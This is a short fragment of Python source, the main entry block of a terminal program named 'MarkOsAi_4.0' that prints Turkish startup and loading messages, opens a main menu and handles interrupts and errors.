if __name__ == "__main__":
    try:
        clear()
        typewriter(f"{RED}MarkOsAi_4.0{R} başlatılıyor...")
        loading("AI çekirdeği yükleniyor")
        loading("Bilgi tabanı hazırlanıyor")
        loading("Hafıza okunuyor")
        time.sleep(0.3)
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{GREEN}Güle güle!{R}")
    except Exception as e:
        print(f"\n{RED}Kritik hata: {e}{R}")
        sys.exit(1)
